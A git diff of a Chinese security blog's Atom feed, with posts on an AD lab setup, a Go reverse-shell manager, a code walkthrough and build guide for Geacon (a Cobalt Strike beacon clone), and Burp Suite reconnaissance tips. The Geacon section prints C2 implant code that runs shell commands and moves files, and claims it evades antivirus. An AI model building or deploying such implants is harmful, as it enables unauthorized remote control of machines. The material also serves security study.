+<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1583203539677.png" alt="" loading="lazy"></figure>
+<p>已经需要域管理账号登录了；</p>
+<p>在AD用户管理中添加域用户账号：</p>
+<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1583204864915.png" alt="" loading="lazy"></figure>
+<p>密码复杂度策略很狗，得设复杂点才行。</p>
+<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/1583205325297.png" alt="" loading="lazy"></figure>
+<p>将其他机器加入域：</p>
+<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/1583206230232.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/1583206236247.png" alt="" loading="lazy"></figure>
+<p>其他机器加入都是一样的操作，至此域环境搭建完成。</p>
+<p>踩坑经验：家庭版系统无法加入域。</p>
+<p>参考文献：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/jassa/p/10170386.html">AD域环境搭建</a></li>
+<li><a href="http://blog.sina.com.cn/s/blog_493cafbb0102wa5s.html">AD目录服务数据库还原模式密码</a></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[利用cscript进行内网端口扫描]]></title>
         <id>https://thekingofduck.github.io/post/scan-ports-by-cscript/</id>
@@ -171,533 +678,6 @@
 <p>使用Python开发，依赖于apkutils模块，可执行文件使用pyinstaller打包。</p>
 </li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ReverseGoShell：一款动态加密的反弹shell管理工具]]></title>
-        <id>https://thekingofduck.github.io/post/ReverseGoShell/</id>
-        <link href="https://thekingofduck.github.io/post/ReverseGoShell/">
-        </link>
-        <updated>2020-02-21T12:08:34.000Z</updated>
-        <summary type="html"><![CDATA[<p>即兴开发。</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>即兴开发。</p>
-<!-- more -->
-<p>Github: https://github.com/TheKingOfDuck/ReverseGoShell/</p>
-<h3 id="description">Description:</h3>
-<p>A Golang Reverse Shell Tools With AES Dynamic Encryption</p>
-<pre><code> _____                               _____       _____ _          _ _ 
-|  __ \     Code By: CoolCat       / ____|     / ____| |        | | |
-| |__) |_____   _____ _ __ ___  ___| |  __  ___| (___ | |__   ___| | |
-|  _  // _ \ \ / / _ \ '__/ __|/ _ \ | |_ |/ _ \\___ \| '_ \ / _ \ | |
-| | \ \  __/\ V /  __/ |  \__ \  __/ |__| | (_) |___) | | | |  __/ | |
-|_|  \_\___| \_/ \___|_|  |___/\___|\_____|\___/_____/|_| |_|\___|_|_| 
- - | Modules    | - Function.
- - | checkav    | - Show Remote-Host Info.
- - | Download   | - Download File from Remote-Host to Local-Host.
- - | Keyloger   | - Unfinished.
- - | Screenshot | - Unfinished.
-
-</code></pre>
-<h3 id="useage">Useage:</h3>
-<h4 id="build">Build</h4>
-<pre><code>go build server.go
-go build client.go
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582287277450.jpg" alt="" loading="lazy"></figure>
-<h4 id="run">Run</h4>
-<pre><code>server 55555
-client 127.0.0.1:55555
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582287290541.jpg" alt="" loading="lazy"></figure>
-<h3 id="features">Features</h3>
-<p>1.AES Dynamic encryption<br>
-2.Supports Multiple Shells</p>
-<h3 id="about">About</h3>
-<p>这个项目只是自己学习Golang过程中实践的产物，代码写得很垃圾，但是注释都尽量写清楚的，通讯流量走tcp协议，采用aes动态加密，可以说是完全模仿冰蝎。基础功能执行命令已实现，模块化的检查存在的杀毒软件以及下载文件写完，其他模块还得在花时间。相比同类小工具我觉得最大的优点就是支持了动态加密，并且可以同时管理多个会话。</p>
-<p><strong>本项目接受建议</strong></p>
-<p>比如希望增加特定功能，再比如某个位置代码写得不规范，或是有bug，有空我会慢慢改。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Geacon代码通读&上线指南]]></title>
-        <id>https://thekingofduck.github.io/post/geacon-program-code-analysis/</id>
-        <link href="https://thekingofduck.github.io/post/geacon-program-code-analysis/">
-        </link>
-        <updated>2020-02-19T12:42:37.000Z</updated>
-        <summary type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
-<!-- more -->
-<h3 id="0x01-写在前面">0x01 写在前面</h3>
-<p>项目地址: https://github.com/darkr4y/geacon</p>
-<p>项目说明:</p>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/readme.png" alt="readme" loading="lazy"></figure>
-<p>这都说了啥...正好在拿go写c2，看下逻辑学习一下。</p>
-<p>代码目录：</p>
-<pre><code>├─cmd
-│  │  main.go                             //主程序
-│  │
-│  ├─config
-│  │      c2profile.go
-│  │      config.go                       //c2配置
-│  │
-│  ├─crypt
-│  │      aes.go
-│  │      rand.go
-│  │      rsa.go
-│  │
-│  ├─packet
-│  │      commands.go
-│  │      http.go
-│  │      packet.go
-│  │
-│  ├─sysinfo
-│  │      meta.go
-│  │      sysinfo_darwin.go
-│  │      sysinfo_linux.go
-│  │      sysinfo_windows.go
-│  │
-│  └─util
-│          util.go
-│
-├─scripts
-│      icons.cna                           //cs脚本
-│
-└─tools
-    └─BeaconTool                           //Beacon RSA生成工具
-</code></pre>
-<h3 id="0x02-代码分析">0x02 代码分析</h3>
-<p>主程序mian.go在cmd目录下:</p>
-<pre><code>package main
-
-import (
-	&quot;bytes&quot;
-	&quot;fmt&quot;
-	&quot;geacon/cmd/config&quot;
-	&quot;geacon/cmd/crypt&quot;
-	&quot;geacon/cmd/packet&quot;
-	&quot;geacon/cmd/util&quot;
-	&quot;io&quot;
-	&quot;os&quot;
-	&quot;time&quot;
-)
-
-
-
-func main() {
-
-	ok := packet.FirstBlood()
-	if ok {
-		for ; ;  {
-			resp := packet.PullCommand()
-			if resp != nil {
-				totalLen := resp.Response().ContentLength
-				if totalLen &gt; 0 {
-					hmacHash := resp.Bytes()[totalLen - crypt.HmacHashLen :]
-					fmt.Printf(&quot;hmac hash: %v\n&quot;, hmacHash)
-					//TODO check the hmachash
-					restBytes := resp.Bytes()[ : totalLen - crypt.HmacHashLen]
-					decrypted := packet.DecryptPacket(restBytes)
-					timestamp := decrypted[:4]
-					fmt.Printf(&quot;timestamp: %v\n&quot;,timestamp)
-					lenBytes := decrypted[4:8]
-					packetLen := packet.ReadInt(lenBytes)
-
-					decryptedBuf := bytes.NewBuffer(decrypted[8:])
-					for ; ;  {
-						if packetLen &lt;= 0 {
-							break
-						}
-						cmdType , cmdBuf := packet.ParsePacket(decryptedBuf , &amp;packetLen)
-						if cmdBuf != nil {
-							switch cmdType {
-							//shell
-							case packet.CMD_TYPE_SHELL:
-								shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
-								result := packet.Shell(shellPath,shellBuf)
-								finalPaket := packet.MakePacket(0,result)
-								packet.PushResult(finalPaket)
-
-							case packet.CMD_TYPE_UPLOAD_START:
-								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
-								packet.Upload(string(filePath),fileData)
-
-							case packet.CMD_TYPE_UPLOAD_LOOP:
-								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
-								packet.Upload(string(filePath),fileData)
-
-							case packet.CMD_TYPE_DOWNLOAD:
-								filePath := cmdBuf
-								//TODO encode
-								strFilePath := string(filePath)
-								fileInfo, err := os.Stat(strFilePath)
-								if err != nil {
-									//TODO notify error to c2
-									break
-								}
-								fileLen := fileInfo.Size()
-								test := int(fileLen)
-								fileLenBytes := packet.WriteInt(test)
-								requestID := crypt.RandomInt(10000, 99999)
-								requestIDBytes := packet.WriteInt(requestID)
-								result := util.BytesCombine(requestIDBytes,fileLenBytes,filePath)
-								finalPaket := packet.MakePacket(2,result)
-								packet.PushResult(finalPaket)
-
-								fileHandle , err := os.Open(strFilePath)
-								if err != nil {
-									break
-								}
-								var fileContent []byte
-								fileBuf := make([]byte, 512 * 1024)
-								for ; ;  {
-									n, err := fileHandle.Read(fileBuf)
-									if err != nil &amp;&amp; err != io.EOF {
-										break
-									}
-									if n == 0 {
-										break
-									}
-									fileContent = fileBuf[:n]
-									result = util.BytesCombine(requestIDBytes,fileContent)
-									finalPaket = packet.MakePacket(8,result)
-									packet.PushResult(finalPaket)
-								}
-
-								finalPaket = packet.MakePacket(9,requestIDBytes)
-								packet.PushResult(finalPaket)
-
-
-
-							case packet.CMD_TYPE_SLEEP:
-								sleep := packet.ReadInt(cmdBuf[:4])
-								//jitter := packet.ReadInt(cmdBuf[4:8])
-								//fmt.Printf(&quot;Now sleep is %d ms, jitter is %d\n&quot;,sleep,jitter)
-								config.WaitTime = time.Duration(sleep) * time.Millisecond
-
-							default:
-								errIdBytes := packet.WriteInt(0) // must be zero
-								arg1Bytes := packet.WriteInt(0) // for debug
-								arg2Bytes := packet.WriteInt(0)
-								errMsgBytes := []byte(&quot;You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.&quot;)
-								result := util.BytesCombine(errIdBytes,arg1Bytes,arg2Bytes,errMsgBytes)
-								finalPaket := packet.MakePacket(31,result)
-								packet.PushResult(finalPaket)
-
-
-							}
-						}
-					}
-				}
-			}			time.Sleep(config.WaitTime)
-		}
-	}
-
-	
-}
-</code></pre>
-<p>main.go line 3-13 导入包<br>
-main.go line 16 程序入口<br>
-main.go line 18 调用packet中的FirstBlood方法（packet.go line 158-170）,代码如下：</p>
-<pre><code>func FirstBlood() bool {//定义返回类型为布尔值
-    
-    /*
-    调用EncryptedMetaInfo方法（packet.go line 130-156）并赋值给encryptedMetaInfo。
-    其中EncryptedMetaInfo方法的作用是调用MakeMetaInfo方法（packet.go line 118-128）并将该方法返回的值字节交给rsa.go中RsaEncrypt方法加密，最终返回加密后的字符串。
-    其中RsaEncrypt在rsa.go line 12-24，在line 14会发现它调用了config.go中line 8 RsaPublicKey变量的值。此处是后面需要修改后再编译的位置1。
-    */
-	encryptedMetaInfo = EncryptedMetaInfo() 
-
-    
-    /*
-    调用HttpGet函数循环发送上线包，如果发送成功就打断循环，休眠，返回True给main.go line 18的ok。
-    其中config.GetUrl为在config.go中line 31 GetUrl变量的值，由plainHTTP,C2变量以及字符串&quot;/load&quot;拼接而成，此处也是后面需要修改后再编译的位置2。   
-    */
-    
-	for ; ;  {
-		resp := HttpGet(config.GetUrl,encryptedMetaInfo)
-		if resp != nil {
-			fmt.Printf(&quot;firstblood: %v\n&quot;,resp)
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-	
-
-	time.Sleep(config.WaitTime)
-	return true
-}
-</code></pre>
-<p>main.go line 19  判断上线包是否发送成功，如果成功进入下一部分，不成功则不执行任何代码。</p>
-<p>main.go line 20  开始for循环</p>
-<p>main.go line 21  该部分为心跳包，调用packet中的PullCommand方法（packet.go line 172-177）循环发送变量encryptedMetaInfo(在发送上线包时获取到的),代码如下：</p>
-<pre><code>func PullCommand() *req.Resp {
-    /*
-    此处未作容错处理，而是直接将所有返回包丢给下一行处理。
-    */
-	resp := HttpGet(config.GetUrl,encryptedMetaInfo)
-	fmt.Printf(&quot;pullcommand: %v\n&quot;,resp.Request().URL)
-	return resp
-}
-</code></pre>
-<p>main.go line 22-23 如果代码没出错就接着运行，出错了就休眠一会儿在继续。休眠时长在config.go中line 20 WaitTime变量中获取<br>
-main.go line 24-25  获取resp中返回包中Content-Length的值,如果大于0就继续运行<br>
-main.go line 25-36  计算消息hmacHash,restBytes等,然后调用packet中的DecryptPacket方法（packet.go line 40-46）对消息进行解密。具体变量类型之类的可参考：</p>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/debug.png" alt="debug" loading="lazy"></figure>
-<p>main.go line 37-40 开始下一个循环，并在循环前先判断packetLen的字节是否小于0，如果是就打断循环。</p>
-<p>main.go line 41 调用packet.go中ParsePacket方法(line 54-76)处理decryptedBuf 和&amp;packetLen并返回commandType和commandBuf。（计算过程复杂，此处不作详细，可cs生成的paylaod进行理解）</p>
-<p>main.go line 42-120行 根据返回的cmdType的不同执行不同的功能模块，以执行命令为例，假如cmdType的返回值为78时就会进入命令执行流程，代码如下：</p>
-<pre><code>/*
-packet.CMD_TYPE_SHELL的值为command.go line 14的CMD_TYPE_SHELL常量
-如果条件满足则调用packet.go中ParseCommandShell方法(line 20-47)处理cmdBuf，并将处理结果交给Shell方法(line 49-76)执行命令。后续即将执行结果发送回控制端。
-*/
-switch cmdType {
-//shell
-case packet.CMD_TYPE_SHELL:
-	shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
-	result := packet.Shell(shellPath,shellBuf)
-	finalPaket := packet.MakePacket(0,result)
-	packet.PushResult(finalPaket)
-</code></pre>
-<p>传送执行结果的方法代码如下：</p>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/PushResult.png" alt="PushResult" loading="lazy"></figure>
-<p>执行命令的方法如下：</p>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/Shell.png" alt="Shell" loading="lazy"></figure>
-<p>可以看到作者有考虑到多平台上线问题。</p>
-<p>可惜：</p>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/Shell2.png" alt="Shell2" loading="lazy"></figure>
-<p>cmdType的值没有计算正确（测试环境 win10下）</p>
-<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cmd.png" alt="cmd" loading="lazy"></figure>
-<p>尝试过多平台兼容的人都知道有多狗。（golang版本问题，需要更新）</p>
-<p>最后如果没有对上会进入作者写的一个debug流程，然后回传到服务器告诉你：</p>
-<pre><code>You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.
-</code></pre>
-<h3 id="0x03-编译上线">0x03 编译上线</h3>
-<p>如果有仔细看上面的代码分析会发现所有的c2配置作者都放到了config/config.go里面，对于修改后再编译就可以了。</p>
-<p>上线共分为三步：</p>
-<h4 id="加载iconscna">加载icons.cna</h4>
-<p>加载cs插件...</p>
-<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/icons.png" alt="icons" loading="lazy"></figure>
-<p>如名字所写，其作用修改beacon会话图标的。</p>
-<h4 id="rsa公钥私钥生成">RSA公钥/私钥生成</h4>
-<p>作者在项目里提供了生成工具（/tools/BeaconTool）：</p>
-<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/tools1.png" alt="tools1" loading="lazy"></figure>
-<p>pemPublicBase64以及pemPrivateBase64即为需要的值，.beacon_keys其实就是cs根目录下的.cobaltstrike.beacon_keys文件。</p>
-<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/tools2.png" alt="tools2" loading="lazy"></figure>
-<p>下载该文件，改下代码，运行一下即可获取需要的值:</p>
-<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/tools3.png" alt="tools3" loading="lazy"></figure>
-<h4 id="编译上线">编译上线</h4>
-<p>直接将代码clone到GOPATH下(避免文件来回复制),然后修改/beacon/cmdconfig/config.go</p>
-<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/code.png" alt="code" loading="lazy"></figure>
-<p>改完go build main.go一下，上线。</p>
-<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/on.png" alt="on" loading="lazy"></figure>
-<p>如图一台linux一台Windows，mac维修去了，尚未测试。</p>
-<h3 id="0x04-总结">0x04 总结</h3>
-<p>正常打包后7M，upx压缩一下2m。卡巴和火绒正常上线，免杀。</p>
-<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/avs.png" alt="avs" loading="lazy"></figure>
-<p>bug挺多的，不过基础功能已经实现了，跟着逻辑调整一下还是会很香的。</p>
-<hr>
-<p>The End ，继续写bug。</p>
-<hr>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[聊聊 Burpsuite Engagement Tools]]></title>
-        <id>https://thekingofduck.github.io/post/burpsuite-engagement-tools/</id>
-        <link href="https://thekingofduck.github.io/post/burpsuite-engagement-tools/">
-        </link>
-        <updated>2020-02-11T12:31:18.000Z</updated>
-        <summary type="html"><![CDATA[<p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
-<!-- more -->
-<!-- more -->
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/main.png" alt="main" loading="lazy"></figure>
-<p>从上往下依次为</p>
-<pre><code>Search                        搜索
-Find Comments                 查找注释
-Find scripts                  查找js代码
-Find references               查找引用
-Analyze target                分析目标
-Discover content              内容勘测
-Schedule task                 定时任务
-Simulate manual testing       人工模拟
-</code></pre>
-<p>以上翻译属于个人理解，非字面意思。如有不同见解，欢迎交流。</p>
-<p>依次聊一下个人的使用心得：</p>
-<h3 id="0x01-search-搜索">0x01 Search 搜索</h3>
-<p>在选定的上右键打开后默认如下：</p>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/search1.png" alt="search1" loading="lazy"></figure>
-<p>输入字符串即可查找需要的字符串，相当于浏览器view-source后再Ctrl + F查找字符串。</p>
-<p>如果只用到这里的话有点不太黑阔，正则搜索这么强大，不用可惜了。</p>
-<p>贴一条自己常用的正则：</p>
-<pre><code>(.user|pass|accessKeyId|accessKeySecret|secretToken|callback|admin|config|key|access|token?)
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/search2.png" alt="search2" loading="lazy"></figure>
-<p>擅用该功能，在SRC捡洞可能可能只是一个习惯而已。（比如每次准备关Burp之前考虑全选site map中所有的站点，再拿正则去尝试一下。）</p>
-<h3 id="0x02-find-comments-查找注释">0x02 Find Comments 查找注释</h3>
-<p>选择目标右键打开后如下图：</p>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/Comments1.png" alt="Comments1" loading="lazy"></figure>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/Comments2.png" alt="Comments2" loading="lazy"></figure>
-<p>可以理解为Search功能的正则写为:</p>
-<pre><code>&lt;!--(.*?)--&gt;
-</code></pre>
-<p>不同语言的注释不一样，burp内置的正则更为全面。测试过程中适当看一下注释内容，没准一个未授权就出来了。</p>
-<h3 id="0x03-find-scripts-查找js代码">0x03 Find scripts 查找js代码</h3>
-<p>选择目标右键打开后如下图：</p>
-<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/script1.png" alt="script1" loading="lazy"></figure>
-<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/script2.png" alt="script2" loading="lazy"></figure>
-<p>该功能处理.js后缀的文件之外，页面中script标签的内容也会自动匹配出来。等同于右键看完当前页面的js逻辑后在接着Ctrl F 搜.js然后继续看代码，在Burp里相对方便得多。</p>
-<h3 id="0x04-find-references-查找引用">0x04 Find references 查找引用</h3>
-<p>选择目标右键打开后如下图：</p>
-<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/references1.png" alt="references1" loading="lazy"></figure>
-<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/references2.png" alt="references2" loading="lazy"></figure>
-<p>如果用过<a href="https://github.com/TheKingOfDuck/myScripts/tree/master/LinksDumper">LinksDumper</a>的话会发现Burp这个功能和它一模一样，都是匹配出页面中存在的各类链接。</p>
-<p>默认自带的功能还有不少人是去用插件或者用独立的程序跑。burp自带的它不香咩？</p>
-<h3 id="0x05-analyze-target-分析目标">0x05 Analyze target 分析目标</h3>
-<p>选择目标右键打开后总共有四个页面</p>
-<p>1.总结页面：</p>
-<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/Analyze1.png" alt="Analyze1" loading="lazy"></figure>
-<p>假设拿到100个目标，筛选软柿子的时候通过总结页面判断一下，寻找交互点多的站点/链接进行单点突破，未尝不是一个高效的选择。</p>
-<p>2.动态Urls：</p>
-<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/Analyze2.png" alt="Analyze2" loading="lazy"></figure>
-<p>该功能可以快速筛选出带外部参数的url，并统计了参数的数量，秉着交互点越多可能存在的问题就越多的原则，筛选一下，效率++。</p>
-<p>3.其他Url：</p>
-<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/Analyze3.png" alt="Analyze3" loading="lazy"></figure>
-<p>该功能可以理解为Find references功能遍历出来所有的连接后再去除Dynamic URLs中带交互点的Url的结果。</p>
-<p>4.参数统计：</p>
-<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/Analyze4.png" alt="Analyze4" loading="lazy"></figure>
-<p>首先是统计了出现过那些参数，其次是这些参数在Url里面出现过次数。有了这个功能在瓶颈渗透提取本站存在的参数时根本不需要第三方插件工具辅助，直接复制name字段即可；某个参数存在漏洞后也可通过该功能查找其他可能存在相同问题的Url。</p>
-<h3 id="0x06-discover-content-内容勘测">0x06 Discover content  内容勘测</h3>
-<p>该功能秒杀一切目录扫描工具。</p>
-<p>下面是关于如何巧用它去递归扫描站点备份的：</p>
-<hr>
-<p>此前在米斯特<code>BurpSuite 插件生态开发组</code>里有提到想开发一款主动的备份扫描插件，寄生于<code>BurpSuite</code>强大的爬虫功能对每个目录/文件进行备份扫描。写一半发现<code>BurpSuite</code>本来就有这样的功能，只是很少有人用到罢了，本文仅对相关功能进行简要的分析以及优化。</p>
-<h4 id="0x06_1-简介">0x06_1 简介</h4>
-<p>正常访问时爬虫被动收集到的目录:</p>
-<figure data-type="image" tabindex="14"><img src="https://mstwiki.acmesec.cn/static/uploads/eff8945b-a523-413a-951b-645552b448a3.jpg" alt="/static/uploads/eff8945b-a523-413a-951b-645552b448a3.jpg" loading="lazy"></figure>
-<p>下面是本文的主角：</p>
-<figure data-type="image" tabindex="15"><img src="https://mstwiki.acmesec.cn/static/uploads/43951031-06ef-4dc9-bfc2-b0b00cede03a.jpg" alt="/static/uploads/43951031-06ef-4dc9-bfc2-b0b00cede03a.jpg" loading="lazy"></figure>
-<p>位于<code>Engagement tools</code> ==&gt; <code>Discover content</code></p>
-<p>看看默认配置：</p>
-<figure data-type="image" tabindex="16"><img src="https://mstwiki.acmesec.cn/static/uploads/42332280-aad3-436d-9f14-7bd8adadcdc4.jpg" alt="/static/uploads/42332280-aad3-436d-9f14-7bd8adadcdc4.jpg" loading="lazy"></figure>
-<p>图中圈起来的第一部分默认勾选了burp内置的四个字典,第二个圈也是默认配置,其作用时从站点中提取各种目录并递归扫描,前面的配置可根据情况修改,后面不建议动它。</p>
-<figure data-type="image" tabindex="17"><img src="https://mstwiki.acmesec.cn/static/uploads/1c7bdd51-7f22-4aae-b4d3-d3182c7a79f9.jpg" alt="/static/uploads/1c7bdd51-7f22-4aae-b4d3-d3182c7a79f9.jpg" loading="lazy"></figure>
-<p>默认配置就是这四项了，下面具体分析一下他扫描的流量，取其精华。</p>
-<h4 id="0x06_2-扫描分析">0x06_2 扫描分析</h4>
-<p>流程1:</p>
-<figure data-type="image" tabindex="18"><img src="https://mstwiki.acmesec.cn/static/uploads/e16ed5cd-e230-4251-932f-c5dead9b9924.jpg" alt="/static/uploads/e16ed5cd-e230-4251-932f-c5dead9b9924.jpg" loading="lazy"></figure>
-<p>先去除所有文件的后缀以及提取目录名当作文件扫一遍。</p>
-<p>流程2:</p>
-<figure data-type="image" tabindex="19"><img src="https://mstwiki.acmesec.cn/static/uploads/1da2ca8b-ee53-46e8-aa3c-97d3f77d9985.jpg" alt="/static/uploads/1da2ca8b-ee53-46e8-aa3c-97d3f77d9985.jpg" loading="lazy"></figure>
-<p>在所有去了后缀的文件名后面加上<code>Test these extentsions</code>配置中的所有后缀并进行扫描，在已知站点语言的情况下此处明显多了很多无效流量。</p>
-<p>流程3:</p>
-<figure data-type="image" tabindex="20"><img src="https://mstwiki.acmesec.cn/static/uploads/0a2b7646-d46e-4d15-9854-1ab5f2740fd1.jpg" alt="/static/uploads/0a2b7646-d46e-4d15-9854-1ab5f2740fd1.jpg" loading="lazy"></figure>
-<p>将流程1中的所有文件名当作目录扫一遍。</p>
-<p>流程4:</p>
-<figure data-type="image" tabindex="21"><img src="https://mstwiki.acmesec.cn/static/uploads/5b4eca82-88dd-4c19-bf1e-f44986131d9c.jpg" alt="/static/uploads/5b4eca82-88dd-4c19-bf1e-f44986131d9c.jpg" loading="lazy"></figure>
-<p>按照配置中Filenames中的字典顺序依次遍历并结合流程2的方式遍历文件。</p>
-<p>流程5:</p>
-<p>依次在每层目录执行一遍流程1-4，如果新目录或文件发现就添加到列队里面。</p>
-<h4 id="0x06_3-优化扫描">0x06_3 优化扫描</h4>
-<figure data-type="image" tabindex="22"><img src="https://mstwiki.acmesec.cn/static/uploads/2fb555a0-a4d9-4c34-8d2b-d4dc9e4a683e.png" alt="/static/uploads/2fb555a0-a4d9-4c34-8d2b-d4dc9e4a683e.png" loading="lazy"></figure>
-<p>缺陷很明显，仅仅三个目录三个文件总共请求了14048次，流量超过20M。</p>
-<p>递归扫描产生的无效流量太多了。</p>
-<p>首要原因出现在:</p>
-<figure data-type="image" tabindex="23"><img src="https://mstwiki.acmesec.cn/static/uploads/d354e20c-8b49-49e3-9706-210dc440689f.jpg" alt="/static/uploads/d354e20c-8b49-49e3-9706-210dc440689f.jpg" loading="lazy"></figure>
-<p>大多数时候，已知语言情况下完全没必要吧所有后缀都跑一遍，留特定语言以及相关后缀。如st2时加上.action/.do,流量去掉大半。</p>
-<p>其次出现在:</p>
-<figure data-type="image" tabindex="24"><img src="https://mstwiki.acmesec.cn/static/uploads/02d3d5c9-89e5-4ca4-96e2-68d36f1f062d.jpg" alt="/static/uploads/02d3d5c9-89e5-4ca4-96e2-68d36f1f062d.jpg" loading="lazy"></figure>
-<p>此处主要针对扫备份，原生字典长这样:</p>
-<pre><code>bac
-BAC
-backup
-BACKUP
-bak
-BAK
-conf
-cs
-csproj
-gz
-inc
-INC
-ini
-java
-log
-lst
-old
-OLD
-orig
-ORIG
-sav
-save
-tar
-temp
-tmp
-TMP
-vb
-vbproj
-zip
-$$$
--OLD
--old
-0
-1
-~1
-~bk
-</code></pre>
-<p>主要针对国外的站吧。这里提供一份。</p>
-<pre><code>txt
-md
-xml
-db
-7z
-rar
-zip
-gz
-tar
-tar.gz
-sql
-bak
-swp
-old
-properties
-inc
-ini
-mdb
-mdf
-conf
-config
-log
-rar
-</code></pre>
-<p>最后是字典的选择：</p>
-<figure data-type="image" tabindex="25"><img src="https://mstwiki.acmesec.cn/static/uploads/a0e1fe7b-10c3-4288-8398-7684a17590a7.png" alt="/static/uploads/a0e1fe7b-10c3-4288-8398-7684a17590a7.png" loading="lazy"></figure>
-<p>burp内置的4个字典内容重复率极高，比如about这个词在四个字典里都分别出现了...四个字典共3266个，去重后2265个。</p>
-<p>结果保存在：</p>
-<pre><code>https://raw.githubusercontent.com/TheKingOfDuck/myScripts/master/burp_dir.txt
-</code></pre>
-<p>文件名方面推荐：</p>
-<pre><code>https://raw.githubusercontent.com/TheKingOfDuck/myScripts/master/burp_filenames.txt
-</code></pre>
-<figure data-type="image" tabindex="26"><img src="https://mstwiki.acmesec.cn/static/uploads/4e84215b-6f57-434d-8943-766a49cfe1d6.jpg" alt="/static/uploads/4e84215b-6f57-434d-8943-766a49cfe1d6.jpg" loading="lazy"></figure>
-<p>如此一来在扫描目录的过程也可把备份一并扫了。</p>
-<figure data-type="image" tabindex="27"><img src="https://mstwiki.acmesec.cn/static/uploads/010baabc-e71c-45b6-a34f-0263fd70699f.jpg" alt="/static/uploads/010baabc-e71c-45b6-a34f-0263fd70699f.jpg" loading="lazy"></figure>
-<hr>
-<h3 id="0x06-schedule-task-定时任务">0x06 Schedule task  定时任务</h3>
-<p>选择目标右键打开后如下图：</p>
-<figure data-type="image" tabindex="28"><img src="https://thekingofduck.github.io/post-images/Schedule1.png" alt="Schedule2" loading="lazy"></figure>
-<p>定时任务，没啥特别的值得说。</p>
-<p>0x07 Simulate manual testing 人工模拟</p>
-<pre><code>This function sends common test payloads to random URL s and parameters at irregular intervals, to generate traflic similar to that caused by manual penetration testing. Its only real use is to let you take a break from testing while still looking busy according to the server's logs. Only items which you selected in the site map will be requested.
-</code></pre>
-<p>正如功能描述中所说的，这是一个懒人挖洞选项。</p>
-<figure data-type="image" tabindex="29"><img src="https://thekingofduck.github.io/post-images/Simulate1.png" alt="Simulate1" loading="lazy"></figure>
-<p>缺陷很明显，不会自动寻找并提交表单，只能依托于已有的表单/参数的基础上进行探测，相当于一款被动扫描器。结合Discover content使用，法力无边。</p>
-<h3 id="0x08-总结">0x08 总结</h3>
-<p>熟练使用这些作战功能，扫描器从此是路人。</p>
-<p>技术交流：https://github.com/TheKingOfDuck</p>
 ]]></content>
     </entry>
 </feed>
